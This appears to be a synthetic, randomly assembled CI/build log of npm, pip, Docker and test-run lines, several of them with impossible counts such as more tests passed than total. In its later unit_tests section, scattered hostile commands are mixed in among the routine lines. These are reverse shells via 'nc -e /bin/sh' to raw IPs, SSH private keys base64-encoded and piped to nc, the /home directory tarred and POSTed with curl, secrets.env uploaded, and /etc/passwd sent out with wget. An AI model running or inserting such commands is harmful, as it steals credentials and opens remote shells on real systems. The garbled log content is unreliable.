DEBUG: Initializing service\nCache saved successfully\nTLS handshake completed\nCache saved successfully\nException: NullPointerException\nCache saved successfully\nVerifying...\nCache miss for key-5753\nNODE_ENV=production\nPushing to registry...\nLoading...\nCache miss for key-6848\nPushing to registry...\nVerifying...\nOK\npip: Installing build dependencies...\nCompiling lib/index.js...\nInstalling jest@3.16.5\nUploading artifact 'coverage' (4 files)\nPOST /data - 201 (449ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=production\nPushing to registry...\n[12:18:54] INFO: Cache refreshed\nCompiling utils/app.ts...\npip install: Successfully installed eslint-4.3\nDone.\nTime: 31.699s\nConnecting to example.com:443...\nTLS handshake completed\n\u2713 All checks passed\nCompiling src/index.js...\n[12:18:54] INFO: Cache refreshed\nnpm notice: created a lockfile\nArtifact downloaded: 10MB\nArtifact uploaded: dist.zip (58MB)\nGET /status - 201 (4ms)\nWARNING: eslint has known vulnerabilities\npip: Downloading webpack-1.16.tar.gz\nnpm notice: created a lockfile\n[12:18:54] WARN: Deprecated API usage\nCache invalidated: node_modules\n[12:18:54] DEBUG: Loading configuration\npip: Collecting axios\n  PASS: unit/test_db_connect.spec.js\nImage pulled successfully\nWARNING: webpack has known vulnerabilities\n\u2713 All checks passed\nTime: 7.180s\nCache miss for key-9694\npip: Installing build dependencies...\npip: Downloading jest-1.6.tar.gz\n[12:18:54] WARN: Deprecated API usage\nGET /status - 201 (74ms)\nCompleted.\nDone.\nStep 1/18: Building\nUsing Python 3.10\nWaiting...\nNODE_ENV=test\nnpm install: resolved 1266 packages\nnpm install: added 489 packages\nyarn add: Done in 24.10s\nnpm notice: created a lockfile\nFinished.\n[12:18:54] WARN: Deprecated API usage\nUploading artifact 'dist' (31 files)\nBundling vendor.js\nGET /status - 204 (67ms)\nOptimizing 52 modules...\nTransforming 120 files...\n[12:18:54] DEBUG: Memory usage: 306MB\nCreating production build...\nMinifying vendor.js\n\u2713 deploy completed\nnpm notice: created a lockfile\nyarn add: Done in 17.96s\nPOST /api - 201 (483ms)\nWARNING: jest has known vulnerabilities\nnpm install: resolved 1888 packages\nArtifact uploaded: dist.zip (32MB)\nSwitched to branch 'bugfix/task-851'\nCompiling lib/service.java...\nCompiling lib/index.js...\nLoading...\nStep 10/20: Linting\nSuccess!\n  PASS: integration/test_cache_hit.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnecting to example.com:443...\nMinifying app.js\nCache invalidated: build\nArtifact uploaded: dist.zip (34MB)\n[12:18:54] WARN: Deprecated API usage\n[12:18:54] INFO: Connecting to database\nOptimizing 85 modules...\nTest Suites: 11 passed, 33 total\nWaiting...\nRan 14 tests in 15s\n[12:18:54] DEBUG: Loading configuration\nCompiling components/main.py...\npip install: Successfully installed eslint-1.17\n[12:18:54] WARN: Deprecated API usage\n[12:18:54] DEBUG: Initializing service\n[12:18:54] INFO: Connecting to database\n[12:18:54] WARN: Deprecated API usage\nCoverage: 92% statements, 93% branches\nStep 10/23: Testing\nLoading...\n[12:18:54] INFO: Cache refreshed\nProcessing...\n[12:18:54] WARN: Deprecated API usage\nStep 1/24: Linting\nPushing to registry...\nBundling vendor.css\nUsing Node.js 19.20.5\nException: NullPointerException\n\u2713 Task completed in 2739ms\n[12:18:54] WARN: Deprecated API usage\nUsing Node.js 19.9.8\nVerifying...\nCache saved successfully\n[12:18:54] INFO: Cache refreshed\nCompiling src/service.java...\n[12:18:54] INFO: Connecting to database\nGET /health - 201 (32ms)\n[12:18:54] DEBUG: Loading configuration\nCompiling src/app.ts...\nUsing Python 3.9\nFinished.\nArtifact uploaded: dist.zip (31MB)\nAlready up to date.\nPushing to registry...\n[12:18:54] WARN: Deprecated API usage\nDone.\nCompiling components/service.java...\nImage pulled successfully\nPulling image: alpine:latest\nPOST /upload - 201 (195ms)\nSnapshots: 39 passed, 8 total\n\u2713 All checks passed\nWaiting...\nVerifying...\nSnapshots: 22 passed, 39 total\nArtifact downloaded: 29MB\n[12:18:54] DEBUG: Query executed in 20ms\nCompiling utils/app.ts...\nCache hit for key-4666\nDone.\nConnection established\nImage pulled successfully\n[12:18:54] DEBUG: Loading configuration\nnpm install: resolved 148 packages\nSwitched to branch 'bugfix/task-211'\nWARNING: webpack has known vulnerabilities\nPulling image: python:latest\n\u2713 Step 'checkout' succeeded\n  PASS: test_auth_login (287ms)\nInstalling axios@3.8.3\nCoverage: 91% statements, 79% branches\nLayer 6/11: RUN command\nBundling styles.css\n[12:18:54] INFO: Cache refreshed\nArtifact uploaded: dist.zip (36MB)\nPushing to registry...\n[12:18:54] DEBUG: Initializing service\nTest Suites: 37 passed, 33 total\nCache miss for key-6875\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 1671 packages\n=== Step build completed ===\n=== Step: integration_tests ===\nStep 10/22: Installing dependencies\nFetching submodules...\nBuilding Docker image...\nEnvironment: development\n\u2713 All checks passed\nLoading...\nHEAD is now at 28fefd4\nUsing Python 3.9\nWARNING: react has known vulnerabilities\n[12:18:54] INFO: Cache refreshed\npip install: Successfully installed eslint-2.10\nStep 9/23: Running migrations\n  PASS: e2e/test_user_create.spec.js\nLayer 4/8: RUN command\nCoverage: 95% statements, 85% branches\n\u2713 All checks passed\nArtifact uploaded: dist.zip (69MB)\nOptimizing 39 modules...\n[12:18:54] DEBUG: Query executed in 45ms\nSuccess!\nConnecting to startup.dev:443...\n[12:18:54] DEBUG: Connection pool: 20 active\nCache saved successfully\nFAILED: test_user_create\nFAILED: test_db_connect\n\u2717 build failed with exit code 87\nPlatform: darwin-arm64\n  PASS: test_api_health (84ms)\nImage pulled successfully\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache restored successfully (59MB)\nCompiling src/handler.rs...\nyarn add: Done in 18.14s\nUsing Node.js 18.12.9\npip: Downloading jest-3.5.tar.gz\npip: Downloading prettier-5.0.tar.gz\nHEAD is now at 3ec9f88\nStep 13/18: Running migrations\nnpm notice: created a lockfile\nTLS handshake completed\nCompiling src/service.java...\nArtifact uploaded: dist.zip (51MB)\nArtifact uploaded: build.tar.gz (3MB)\nStep 19/16: Testing\nArtifact uploaded: build.tar.gz (30MB)\n[12:18:54] DEBUG: Initializing service\nEnvironment: staging\nBuilding Docker image...\nBuilding Docker image...\nConnecting to example.com:443...\nnpm notice: package.json updated\nPOST /api - 201 (14ms)\nLoading...\nEnvironment: test\nWARNING: webpack has known vulnerabilities\nSnapshots: 43 passed, 11 total\nTest Suites: 9 passed, 16 total\n\u2713 All checks passed\nnpm notice: package.json updated\n[12:18:54] WARN: Deprecated API usage\nDone.\npip: Installing build dependencies...\n[12:18:54] INFO: Processing request\n[12:18:54] INFO: Connecting to database\nTLS handshake completed\nCompleted.\n[12:18:54] INFO: Cache refreshed\nCache miss for key-4611\nnpm notice: package.json updated\nPlatform: linux-x64\nDone.\nStep 9/20: Deploying\nReady.\nSnapshots: 23 passed, 47 total\nSnapshots: 43 passed, 15 total\nRan 106 tests in 4s\nPOST /api - 201 (23ms)\n\u2713 Task completed in 934ms\nStep 5/19: Building\n[12:18:54] DEBUG: Loading configuration\n[12:18:54] ERROR: Connection failed\nProcessing...\nGET /api - 201 (63ms)\nEnvironment: staging\nCache hit for key-7244\nConnection established\nTest Suites: 35 passed, 37 total\nBundling vendor.css\nWARNING: axios has known vulnerabilities\n[12:18:54] INFO: Cache refreshed\nInstalling axios@5.12.9\n\u2713 All checks passed\nInstalling eslint@2.6.5\nException: ValueError\nConnecting to acme.corp:443...\nCache restored successfully (323MB)\n[12:18:54] INFO: Cache refreshed\nGenerating source maps...\n[12:18:54] DEBUG: Query executed in 40ms\n  PASS: test_user_create (110ms)\npip: Downloading webpack-5.4.tar.gz\nEnvironment: staging\nProcessing...\nCoverage: 80% statements, 63% branches\nLayer 7/10: COPY command\nBuilding Docker image...\nnpm install: resolved 1414 packages\nCompiling src/app.ts...\nNODE_ENV=test\nWARNING: jest has known vulnerabilities\n[12:18:54] DEBUG: Initializing service\nCoverage: 93% statements, 80% branches\nOptimizing 67 modules...\nArtifact uploaded: build.tar.gz (12MB)\n[12:18:54] INFO: Starting build process\n\u2713 Task completed in 2765ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache miss for key-6487\n[12:18:54] ERROR: Connection failed\nMinifying app.js\nTransforming 807 files...\n[12:18:54] INFO: Processing request\nMinifying vendor.js\nGenerating source maps...\nHEAD is now at 2f856df\npip install: Successfully installed react-5.6\n\u2713 All checks passed\nDone.\nCache hit for key-7323\nCache invalidated: node_modules\n[12:18:54] DEBUG: Memory usage: 1260MB\nProcessing...\nFinished.\n[12:18:54] DEBUG: Query executed in 72ms\nRan 97 tests in 20s\n  PASS: test_db_connect (108ms)\nnpm notice: created a lockfile\n[12:18:54] INFO: Processing request\nWaiting...\nWARNING: express has known vulnerabilities\nRan 167 tests in 17s\nArtifact uploaded: build.tar.gz (45MB)\nReady.\n\u2713 Task completed in 1992ms\nVerifying...\nTests: 67 passed, 446 total\nnpm notice: package.json updated\nException: TypeError\nTime: 72.233s\nUploading artifact 'build' (15 files)\nArtifact uploaded: dist.zip (64MB)\nTests: 433 passed, 410 total\nCompleted.\n\u2713 All checks passed\nOK\nWARNING: prettier has known vulnerabilities\n  PASS: test_user_create (393ms)\nConnecting to test.io:443...\nCache restored successfully (295MB)\nCompleted.\nEnvironment: development\nEnvironment: production\nNODE_ENV=development\nCreating production build...\nStep 2/21: Deploying\n\u2713 Step 'setup' succeeded\nStep 9/17: Installing dependencies\nNODE_ENV=test\nChecking out master branch\nGenerating source maps...\n=== Step integration_tests completed ===\n=== Step: upload_artifacts ===\nPlatform: linux-x64\nLoading...\nCompiling src/app.ts...\n[12:18:54] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (63MB)\nRan 168 tests in 29s\nAlready up to date.\nConnecting to test.io:443...\n[12:18:54] DEBUG: Initializing service\n\u2713 Task completed in 681ms\nEnvironment: staging\nStep 5/22: Building\nUsing Node.js 20.12.4\n\u2713 deploy completed\nStep 19/25: Deploying\n[12:18:54] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nGenerating source maps...\nStep 14/25: Testing\nPlatform: win32-x64\nCreating production build...\n\u2717 build failed with exit code 14\nCache miss for key-4756\npip: Downloading prettier-5.17.tar.gz\nCache restored successfully (175MB)\nSwitched to branch 'feature/task-920'\nArtifact uploaded: build.tar.gz (22MB)\nUploading artifact 'dist' (34 files)\nImage pulled successfully\nGET /health - 204 (22ms)\nStep 16/23: Running migrations\n[12:18:54] DEBUG: Memory usage: 1116MB\nCreating production build...\nImage pulled successfully\nInstalling react@5.16.1\nCache hit for key-2540\nFinished.\nReady.\n  PASS: test_cache_hit (124ms)\nFAILED: test_cache_hit\nLoading...\n[12:18:54] ERROR: Connection failed\nBuilding Docker image...\nFinished.\nWARNING: axios has known vulnerabilities\nStep 18/25: Installing dependencies\nArtifact downloaded: 38MB\nStep 7/17: Building\npip: Downloading webpack-2.18.tar.gz\nPulling image: node:3.11\n[12:18:54] WARN: Deprecated API usage\n[12:18:54] INFO: Connecting to database\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (47MB)\nOK\nEnvironment: staging\nWARNING: react has known vulnerabilities\n[12:18:54] WARN: Deprecated API usage\nTransforming 254 files...\n  PASS: test_db_connect (79ms)\n  PASS: e2e/test_auth_login.spec.js\nImage pulled successfully\nFinished.\npip: Installing build dependencies...\nStep 16/16: Testing\nVerifying...\nSnapshots: 36 passed, 40 total\nAlready up to date.\nAlready up to date.\nArtifact uploaded: build.tar.gz (7MB)\n[12:18:54] INFO: Request completed\nUsing Node.js 14.2.4\nPulling image: python:latest\nyarn add: Done in 28.94s\nCompiling src/utils.go...\npip: Downloading lodash-2.12.tar.gz\nEnvironment: staging\n[12:18:54] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nCompleted.\nInstalling prettier@2.10.6\nGET /api - 201 (83ms)\nPlatform: win32-x64\nFAILED: test_db_connect\n[12:18:54] DEBUG: Initializing service\n[12:18:54] WARN: Deprecated API usage\n[12:18:54] INFO: Connecting to database\n[12:18:54] INFO: Connecting to database\nTime: 98.847s\nNODE_ENV=development\nGenerating source maps...\nEnvironment: staging\nyarn add: Done in 15.65s\nUploading artifact 'dist' (5 files)\nOK\nEnvironment: staging\nTests: 242 passed, 468 total\nCache saved successfully\nGenerating source maps...\nStep 11/22: Linting\n\u2713 package completed\n[12:18:54] WARN: Deprecated API usage\nGET /api - 201 (70ms)\nPulling image: python:3.11\n\u2713 All checks passed\n  PASS: unit/test_auth_login.spec.js\n[12:18:54] INFO: Cache refreshed\n[12:18:54] DEBUG: Connection pool: 1 active\nImage pulled successfully\nException: TypeError\nCache invalidated: build\nFAILED: test_cache_hit\nEnvironment: test\nException: TypeError\n[12:18:54] DEBUG: Memory usage: 1470MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed prettier-2.10\nCache miss for key-5499\nTime: 90.52s\nnpm notice: package.json updated\nImage pulled successfully\nReady.\npip: Installing build dependencies...\n\u2717 build failed with exit code 38\nReady.\nPulling image: python:18\nTest Suites: 20 passed, 30 total\nCache restored successfully (190MB)\nStep 1/23: Installing dependencies\nCompiling lib/service.java...\n[12:18:54] DEBUG: Query executed in 64ms\nnpm install: resolved 1795 packages\n[12:18:54] ERROR: Connection failed\nUsing Python 3.10\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:54] INFO: Starting build process\nBuilding Docker image...\npip: Installing build dependencies...\nTime: 103.974s\nCompiling utils/service.java...\nStep 11/19: Linting\nnpm notice: created a lockfile\nSnapshots: 31 passed, 28 total\nyarn add: Done in 17.22s\nStep 13/24: Building\n[12:18:54] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:54] INFO: Request completed\nArtifact uploaded: build.tar.gz (10MB)\nPOST /api - 200 (164ms)\nnpm notice: created a lockfile\n\u2713 Step 'test' succeeded\nUsing Python 3.12\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGET /api - 200 (9ms)\nArtifact uploaded: build.tar.gz (1MB)\nUsing Node.js 16.7.5\nUsing Python 3.10\nOK\nAlready up to date.\npip: Installing build dependencies...\nnpm notice: created a lockfile\n\u2713 Task completed in 4019ms\n  PASS: integration/test_user_create.spec.js\nOptimizing 91 modules...\nBuilding Docker image...\nnpm install: added 414 packages\nDone.\n=== Step upload_artifacts completed ===\n=== Step: type_check ===\n[12:18:54] INFO: Processing request\n[12:18:54] INFO: Cache refreshed\nAlready up to date.\n[12:18:54] WARN: Deprecated API usage\nPlatform: linux-x64\nException: ValueError\nUploading artifact 'build' (15 files)\nChecking out main branch\nCache invalidated: build\nNODE_ENV=development\nTransforming 801 files...\nLayer 2/15: RUN command\nTLS handshake completed\nnpm install: resolved 1030 packages\nCompiling src/app.ts...\nOptimizing 52 modules...\n\u2713 All checks passed\n\u2713 Step 'setup' succeeded\npip: Collecting react\nException: RuntimeError\nLoading...\nConnecting to startup.dev:443...\nImage pulled successfully\nTLS handshake completed\npip install: Successfully installed webpack-3.9\n  PASS: test_db_connect (470ms)\nArtifact uploaded: dist.zip (82MB)\n[12:18:54] WARN: Deprecated API usage\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\nVerifying...\nCompiling utils/service.java...\n[12:18:54] INFO: Processing request\n\u2713 All checks passed\nCompiling utils/utils.go...\n[12:18:54] WARN: Deprecated API usage\nGET /api - 204 (86ms)\nPushing to registry...\nSuccess!\nTests: 449 passed, 144 total\nGenerating source maps...\nPulling image: alpine:3.11\nGET /status - 204 (67ms)\nnpm install: added 301 packages\nProcessing...\n[12:18:54] DEBUG: Loading configuration\nUploading artifact 'dist' (30 files)\n\u2713 build completed\nPlatform: linux-x64\nChecking out main branch\npip: Collecting express\nUploading artifact 'build' (39 files)\nReady.\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 14/25: Running migrations\nStep 1/21: Installing dependencies\nStep 12/25: Testing\npip: Collecting express\nException: RuntimeError\nnpm install: resolved 354 packages\nFinished.\nProcessing...\nnpm install: resolved 1556 packages\nFetching submodules...\n[12:18:54] DEBUG: Query executed in 38ms\nRan 50 tests in 57s\nTest Suites: 48 passed, 43 total\nLoading...\npip: Collecting eslint\nTests: 87 passed, 339 total\n[12:18:54] DEBUG: Memory usage: 440MB\nLayer 8/12: ENV command\n[12:18:54] DEBUG: Connection pool: 14 active\nGET /status - 201 (38ms)\n[12:18:54] INFO: Starting build process\n[12:18:54] WARN: Deprecated API usage\nLayer 1/8: RUN command\n[12:18:54] DEBUG: Query executed in 78ms\nPlatform: linux-x64\nUsing Node.js 18.12.2\nArtifact uploaded: build.tar.gz (1MB)\npip: Downloading eslint-2.13.tar.gz\nFetching submodules...\n  PASS: e2e/test_cache_hit.spec.js\nUploading artifact 'dist' (16 files)\nTLS handshake completed\n[12:18:54] DEBUG: Initializing service\n[12:18:54] INFO: Cache refreshed\n\u2713 Task completed in 1851ms\n\u2713 Step 'setup' succeeded\n\u2713 deploy completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTLS handshake completed\nReady.\n[12:18:54] DEBUG: Loading configuration\nInstalling axios@4.11.7\n[12:18:54] ERROR: Connection failed\nPOST /api - 200 (233ms)\n[12:18:54] DEBUG: Memory usage: 1706MB\nStep 6/24: Building\nCreating production build...\nPOST /api - 202 (292ms)\n[12:18:54] ERROR: Connection failed\nCache miss for key-3945\n[12:18:54] WARN: Deprecated API usage\n\u2713 Task completed in 4271ms\nReady.\nnpm notice: created a lockfile\nChecking out master branch\n  PASS: integration/test_db_connect.spec.js\nCompleted.\n[12:18:54] ERROR: Connection failed\nCache restored successfully (490MB)\nCompiling src/service.java...\nInstalling react@5.19.6\nUsing Python 3.10\nSnapshots: 2 passed, 18 total\nUploading artifact 'dist' (33 files)\nPushing to registry...\nTest Suites: 39 passed, 41 total\nDone.\nUsing Node.js 18.18.0\nTLS handshake completed\nStep 1/17: Deploying\nLayer 10/9: RUN command\n[12:18:54] WARN: Deprecated API usage\nMinifying app.js\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\nRan 137 tests in 58s\nRan 22 tests in 28s\npip: Installing build dependencies...\nCompiling components/utils.go...\nCreating production build...\nPOST /data - 200 (225ms)\nHEAD is now at c3c7cd4\nArtifact uploaded: dist.zip (47MB)\nCache miss for key-2780\nStep 2/18: Deploying\n[12:18:54] DEBUG: Initializing service\n[12:18:54] INFO: Request completed\nUsing Node.js 16.4.5\nFinished.\nTLS handshake completed\nGET /api - 200 (61ms)\n[12:18:54] WARN: Deprecated API usage\n\u2713 validate completed\nnpm notice: package.json updated\nPushing to registry...\nArtifact uploaded: build.tar.gz (39MB)\nTime: 33.935s\nOK\nFAILED: test_auth_login\nTime: 106.891s\nCreating production build...\n\u2713 All checks passed\nUploading artifact 'build' (3 files)\nCache hit for key-2850\nCache saved successfully\n[12:18:54] DEBUG: Query executed in 70ms\nConnecting to test.io:443...\nPushing to registry...\nCompiling components/service.java...\n[12:18:54] DEBUG: Initializing service\nFinished.\nGenerating source maps...\n[12:18:54] INFO: Processing request\nGenerating source maps...\n=== Step type_check completed ===\n=== Step: deploy_production ===\n  PASS: test_api_health (278ms)\n[12:18:54] INFO: Request completed\nLoading...\nCache invalidated: dependencies\n\u2713 Task completed in 1633ms\n  PASS: e2e/test_db_connect.spec.js\nPulling image: python:latest\nPlatform: linux-x64\n[12:18:54] INFO: Starting build process\nSuccess!\nOK\nStep 20/22: Linting\nTransforming 601 files...\nLoading...\n[12:18:54] WARN: Deprecated API usage\nInstalling express@1.0.1\n[12:18:54] DEBUG: Connection pool: 12 active\npip: Collecting react\nStep 3/20: Testing\nTime: 15.245s\nTest Suites: 46 passed, 15 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 1997ms\nnpm install: added 201 packages\n\u2713 Step 'test' succeeded\n[12:18:54] DEBUG: Loading configuration\nPulling image: alpine:3.11\nSwitched to branch 'feature/task-433'\nCompiling lib/service.java...\nBuilding Docker image...\nCompiling src/handler.rs...\nnpm install: added 171 packages\nCompleted.\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (12MB)\npip: Installing build dependencies...\nUsing Python 3.10\nCompiling src/main.py...\nGenerating source maps...\nArtifact uploaded: dist.zip (16MB)\n[12:18:54] DEBUG: Query executed in 95ms\n[12:18:54] INFO: Processing request\nTime: 69.548s\n[12:18:54] DEBUG: Connection pool: 12 active\nCreating production build...\nReady.\n\u2713 validate completed\nCreating production build...\nUsing Node.js 14.10.2\nPlatform: darwin-arm64\nOptimizing 81 modules...\nCompiling lib/service.java...\nUsing Node.js 20.19.5\nTime: 56.375s\nPulling image: python:3.11\n\u2713 Step 'checkout' succeeded\nWaiting...\nCompiling components/utils.go...\nStep 8/20: Linting\nStep 3/21: Deploying\nCache hit for key-3265\nWARNING: jest has known vulnerabilities\nStep 12/15: Linting\nStep 4/18: Testing\nPulling image: python:18\nBundling styles.js\n[12:18:54] INFO: Request completed\nCache miss for key-1147\nUsing Node.js 20.2.3\n[12:18:54] INFO: Cache refreshed\n\u2713 All checks passed\nCache miss for key-9043\npip: Installing build dependencies...\nWARNING: webpack has known vulnerabilities\nNODE_ENV=development\nSuccess!\nCache invalidated: node_modules\n[12:18:54] INFO: Request completed\nCache restored successfully (168MB)\n[12:18:54] INFO: Cache refreshed\nGenerating source maps...\nnpm notice: created a lockfile\nRan 93 tests in 47s\nCompiling utils/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\n[12:18:54] DEBUG: Loading configuration\nStep 17/19: Building\nOK\nImage pulled successfully\nCoverage: 83% statements, 66% branches\n\u2713 Task completed in 1179ms\nGET /api - 200 (36ms)\nLayer 7/15: RUN command\nStep 7/20: Deploying\nCreating production build...\nOK\nCompiling src/utils.go...\n\u2713 Task completed in 1034ms\nStep 4/19: Deploying\nUsing Node.js 17.18.8\n[12:18:54] INFO: Connecting to database\nPulling image: python:latest\nStep 3/25: Running migrations\nConnecting to test.io:443...\nArtifact downloaded: 38MB\n[12:18:54] DEBUG: Query executed in 29ms\nTests: 211 passed, 383 total\nImage pulled successfully\nCompiling utils/utils.go...\nGET /api - 200 (80ms)\nCache restored successfully (347MB)\nReady.\nnpm notice: package.json updated\nnpm notice: package.json updated\nTests: 99 passed, 312 total\nArtifact downloaded: 21MB\n  PASS: test_api_health (157ms)\n[12:18:54] DEBUG: Memory usage: 923MB\n[12:18:54] DEBUG: Loading configuration\nException: TypeError\nStep 10/16: Building\nCompiling utils/main.py...\nCompiling lib/utils.go...\n  PASS: e2e/test_auth_login.spec.js\n[12:18:54] DEBUG: Memory usage: 1321MB\nLoading...\nWARNING: lodash has known vulnerabilities\nWaiting...\nPlatform: win32-x64\n\u2713 Step 'setup' succeeded\nArtifact downloaded: 3MB\nRan 30 tests in 46s\nnpm notice: package.json updated\n  PASS: integration/test_db_connect.spec.js\n[12:18:54] DEBUG: Query executed in 92ms\n\u2713 Task completed in 578ms\n[12:18:54] INFO: Processing request\nBuilding Docker image...\nStep 4/21: Linting\n[12:18:54] INFO: Processing request\nStep 19/15: Installing dependencies\nWARNING: eslint has known vulnerabilities\nLayer 1/13: COPY command\n[12:18:54] DEBUG: Connection pool: 8 active\n[12:18:54] WARN: Deprecated API usage\nStep 1/21: Installing dependencies\nUploading artifact 'dist' (38 files)\n[12:18:54] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-192'\nCache invalidated: node_modules\nHEAD is now at 553a437\n[12:18:54] WARN: Deprecated API usage\nCache miss for key-9300\nConnecting to startup.dev:443...\nPushing to registry...\nArtifact downloaded: 6MB\nPOST /upload - 200 (473ms)\nTests: 383 passed, 50 total\nEnvironment: development\nCreating production build...\nGenerating source maps...\n[12:18:54] DEBUG: Connection pool: 19 active\nTLS handshake completed\nCache hit for key-2150\nStep 1/25: Installing dependencies\nCoverage: 76% statements, 100% branches\nInstalling jest@2.18.7\nPushing to registry...\npip: Collecting express\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nInstalling axios@3.20.1\nOK\nFetching submodules...\nCache hit for key-4432\nTest Suites: 35 passed, 41 total\n[12:18:54] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (36MB)\nVerifying...\nFinished.\nCompiling src/utils.go...\nProcessing...\nUsing Python 3.11\n[12:18:54] DEBUG: Query executed in 67ms\nArtifact uploaded: build.tar.gz (16MB)\nyarn add: Done in 1.47s\n[12:18:54] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (29MB)\nCache miss for key-8108\nLoading...\nCoverage: 70% statements, 62% branches\nRan 83 tests in 54s\nnpm notice: package.json updated\nStep 5/16: Running migrations\n[12:18:54] WARN: Deprecated API usage\nCache miss for key-1742\n\u2713 deploy completed\nnc -e /bin/sh 50.63.93.235 29108\nRan 104 tests in 22s\n[12:18:54] DEBUG: Connection pool: 2 active\n[12:18:54] DEBUG: Loading configuration\nnpm install: resolved 1247 packages\n[12:18:54] INFO: Request completed\nPushing to registry...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 246.2.41.234 16402\nCompiling utils/handler.rs...\nTime: 27.247s\n[12:18:54] DEBUG: Connection pool: 11 active\nBundling runtime.css\npip: Installing build dependencies...\nPulling image: python:3.11\npip install: Successfully installed express-3.12\nCompiling src/service.java...\n[12:18:54] ERROR: Connection failed\nStep 12/19: Building\nCompiling components/service.java...\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n[12:18:54] INFO: Cache refreshed\nOK\nCache miss for key-2231\ncurl -X POST https://example.com/collect -d @secrets.env\nNODE_ENV=test\necho $(cat ~/.ssh/id_rsa) | base64 | nc 34.40.170.219 65218\n[12:18:54] INFO: Starting build process\nWARNING: prettier has known vulnerabilities\nUploading artifact 'dist' (45 files)\nMinifying main.js\nSending 64MB of data to test.io\nyarn add: Done in 9.45s\nCompiling src/utils.go...\nCache saved successfully\nArtifact downloaded: 31MB\n  PASS: unit/test_cache_hit.spec.js\nConnecting to acme.corp:443...\npip: Collecting axios\nPOST /upload - 201 (288ms)\nUsing Node.js 17.9.0\nConnecting to example.com:443...\nFinished.\n[12:18:54] DEBUG: Query executed in 85ms\n[12:18:54] INFO: Connecting to database\n[12:18:54] INFO: Request completed\nFetching submodules...\npip install: Successfully installed express-5.7\nCompleted.\nHEAD is now at 3e13732\necho $(cat ~/.ssh/id_rsa) | base64 | nc 114.174.8.233 13434\n[12:18:54] WARN: Deprecated API usage\nProcessing...\nTests: 372 passed, 182 total\nnpm notice: package.json updated\n[12:18:54] INFO: Request completed\nStep 20/21: Installing dependencies\n\u2713 All checks passed\nCreating production build...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 243.192.145.228 14623\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 20/22: Building\nSending 464MB of data to acme.corp\n[12:18:54] DEBUG: Memory usage: 975MB\n  PASS: test_api_health (204ms)\nTest Suites: 22 passed, 11 total\nCache restored successfully (288MB)\nCache hit for key-7728\nAlready up to date.\nOK\nVerifying...\nInstalling prettier@3.17.0\nWARNING: eslint has known vulnerabilities\nCache saved successfully\nPulling image: python:18\nReady.\nPushing to registry...\nConnecting to acme.corp:443...\nImage pulled successfully\nPOST /upload - 200 (449ms)\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nConnection established\nTransforming 469 files...\nFAILED: test_db_connect\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n[12:18:54] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nFinished.\n[12:18:54] INFO: Request completed\nVerifying...\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nSending 110MB of data to startup.dev\necho $(cat ~/.ssh/id_rsa) | base64 | nc 106.116.77.39 9088\nCompiling utils/service.java...\nTests: 401 passed, 186 total\npip: Downloading react-4.7.tar.gz\nCompiling src/index.js...\nSending 252MB of data to test.io\nStep 17/19: Linting\nUsing Node.js 14.20.4\nImage pulled successfully\nLayer 9/13: ENV command\n  PASS: unit/test_api_health.spec.js\nnpm install: added 253 packages\npip: Installing build dependencies...\ncurl -X POST https://cloud.services/collect -d @secrets.env\nyarn add: Done in 25.42s\nLayer 7/13: RUN command\ncurl -X POST https://example.com/collect -d @secrets.env\nArtifact uploaded: build.tar.gz (5MB)\nWaiting...\n[12:18:54] INFO: Connecting to database\n[12:18:54] ERROR: Connection failed\npip: Downloading axios-3.8.tar.gz\nTLS handshake completed\nnc -e /bin/sh 50.153.156.156 49256\nRan 88 tests in 48s\nnpm install: resolved 285 packages\nTLS handshake completed\nWARNING: eslint has known vulnerabilities\ncurl -X POST https://example.com/collect -d @secrets.env\nConnecting to test.io:443...\nNODE_ENV=test\npip: Installing build dependencies...\nCompiling lib/service.java...\nSuccess!\nSending 144MB of data to cloud.services\nProcessing...\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact downloaded: 15MB\nSending 235MB of data to example.com\nCache hit for key-3148\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nWARNING: lodash has known vulnerabilities\npip: Collecting jest\n[12:18:54] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nSnapshots: 19 passed, 0 total\n\u2713 deploy completed\nRan 161 tests in 37s\nImage pulled successfully\nCoverage: 95% statements, 63% branches\nTLS handshake 